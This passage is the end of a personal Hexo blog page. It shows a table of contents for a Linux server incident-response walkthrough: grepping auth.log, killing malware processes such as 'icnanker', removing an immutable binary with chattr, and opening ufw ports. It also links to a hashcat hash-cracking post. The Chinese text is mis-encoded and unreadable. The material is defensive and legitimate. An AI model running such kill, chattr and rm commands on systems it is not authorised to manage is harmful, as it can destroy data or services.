          å¿«é€Ÿç ´è§£å„ç§æ•£åˆ—hash [ hashcatå…¥é—¨ç¯‡ ]
        
      </div>
    </a>
  
  
    <a href="/2018/03/09/ES6æ¥å®ŒæˆNodeJs/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Viejo</strong>
      <div class="article-nav-title">ES6æ¥å®ŒæˆNodeJs</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Inhalt</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#grep-â€œAcceptedâ€-var-log-auth-log-1"><span class="nav-number">1.</span> <span class="nav-text">grep â€œAcceptedâ€ /var/log/auth.log.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#grep-â€œJan-2-5-8-sshd-Failedâ€-var-log-auth-log-1-wc"><span class="nav-number">2.</span> <span class="nav-text">grep â€œJan 2[5-8] .sshd.Failedâ€ /var/log/auth.log.1 | wc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#history"><span class="nav-number">3.</span> <span class="nav-text">history</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cat-etc-init-d-apache2-sh"><span class="nav-number">4.</span> <span class="nav-text">cat /etc/init.d/apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-13648-æ€æ‰apache2-sh"><span class="nav-number">5.</span> <span class="nav-text">kill 13648  # æ€æ‰apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-14519-æ€æ‰â€icnankerâ€"><span class="nav-number">6.</span> <span class="nav-text">kill 14519  # æ€æ‰â€icnankerâ€</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kill-26595-æ€æ‰-sshd"><span class="nav-number">7.</span> <span class="nav-text">kill 26595  # æ€æ‰.sshd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#history-1"><span class="nav-number">8.</span> <span class="nav-text">history</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cat-etc-init-d-apache2-sh-1"><span class="nav-number">9.</span> <span class="nav-text">cat /etc/init.d/apache2.sh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rm-usr-bin-icnanker"><span class="nav-number">10.</span> <span class="nav-text">rm /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lockr-i-usr-bin-chattr"><span class="nav-number">11.</span> <span class="nav-text">lockr -i /usr/bin/chattr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#chmod-755-usr-bin-chattr"><span class="nav-number">12.</span> <span class="nav-text">chmod 755 /usr/bin/chattr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#chattr-i-usr-bin-icnanker"><span class="nav-number">13.</span> <span class="nav-text">chattr -i /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rm-usr-bin-icnanker-1"><span class="nav-number">14.</span> <span class="nav-text">rm /usr/bin/icnanker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ufw-allow-80-tcp"><span class="nav-number">15.</span> <span class="nav-text">ufw allow 80/tcp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ufw-allow-ssh"><span class="nav-number">16.</span> <span class="nav-text">ufw allow ssh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#monitor-yesterdayâ€™s-login-via-ssh-and-send-report-email"><span class="nav-number">17.</span> <span class="nav-text">monitor yesterdayâ€™s login via ssh, and send report email</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Construido por <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/JoeJoeyMa/JoeJoeyMa.github.io" target="_blank">Hexo-theme-Joejoey</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2019 To change is to be better to change often is to change perfect All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">About themes</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
    <a href="/book" class="mobile-nav-link">ğŸ““</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>




  <script src="/js/dialog.js"></script>



<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114383200-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->






	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">è®¾ç½®</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              æ­£æ–‡å­—å·å¤§å°
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            æ‚¨å·²è°ƒæ•´é¡µé¢å­—ä½“å¤§å°
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              å¤œé—´æŠ¤çœ¼æ¨¡å¼
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            å¤œé—´æ¨¡å¼å·²ç»å¼€å¯ï¼Œå†æ¬¡å•å‡»æŒ‰é’®å³å¯å…³é—­ 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;å…³ äº&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            To change is to be better to change often is to change perfect
          </div>
          <div class="panel-body">
            Copyright Â© 2019 To change is to be better to change often is to change perfect All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>